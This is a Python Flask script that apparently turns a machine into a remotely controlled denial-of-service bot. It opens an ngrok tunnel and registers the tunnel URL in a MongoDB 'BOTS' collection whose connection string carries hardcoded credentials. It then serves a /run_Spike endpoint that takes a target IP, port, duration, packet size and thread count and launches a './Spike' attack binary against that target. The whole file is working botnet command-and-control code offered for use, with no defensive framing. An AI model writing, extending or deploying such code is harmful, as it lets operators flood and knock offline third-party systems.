import os
import subprocess
from flask import Flask, request, jsonify
from pyngrok import ngrok
import pymongo
import config  

app = Flask(__name__)

# MongoDB connection
client = pymongo.MongoClient("mongodb+srv://BLACKHAT:SPIKE@cluster0.h3sxp.mongodb.net/BOTS?retryWrites=true&w=majority&appName=Cluster0")
db = client["BOTS"]
collection = db["ngrok_urls"]

# Config variables
USER_ID = config.USER_ID
NGROK_AUTH_TOKEN = config.NGROK_AUTH_TOKEN

# Set ngrok authentication token and start tunnel
ngrok.set_auth_token(NGROK_AUTH_TOKEN)
public_url = ngrok.connect(6000).public_url  
print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:6000\"")

# Check if user exists in MongoDB
existing_user = collection.find_one({"user_id": USER_ID})
if existing_user:
    # Append ngrok URL to the array if user exists
    collection.update_one(
        {"user_id": USER_ID}, 
        {"$push": {"ngrok_urls": public_url.strip()}}
    )
    print(f"Appended ngrok URL for user ID: {USER_ID} to {public_url}")
else:
    # Create a new user entry with the ngrok URL in an array
    collection.insert_one({"user_id": USER_ID, "ngrok_urls": [public_url.strip()]})
    print(f"Saved new ngrok URL to MongoDB: {public_url} for user ID: {USER_ID}")

# Flask endpoint
@app.route('/run_Spike', methods=['POST'])
def run_spike():
    data = request.get_json()
    ip = data.get("ip")
    port = data.get("port")
    duration = data.get("time")
    packet_size = data.get("packet_size")
    threads = data.get("threads")

    if not (ip and port and duration and packet_size and threads):
        return jsonify({"error": "Missing required parameters (ip, port, time, packet_size, threads)"}), 400

    try:
        # Execute the Spike command
        result = subprocess.run(
            ["./Spike", ip, str(port), str(duration), str(packet_size), str(threads)],
            capture_output=True, text=True
        )

        output = result.stdout
        error = result.stderr

        print(f"Attack Output: {output}")
        print(f"Attack Error: {error}")

        return jsonify({"output": output, "error": error})
    except Exception as e:
        return jsonify({"error": f"Failed to run Spike: {str(e)}"}), 500

if __name__ == '__main__':
    print(f"Server running at public URL: {public_url}/run_Spike")
    app.run(port=6000)
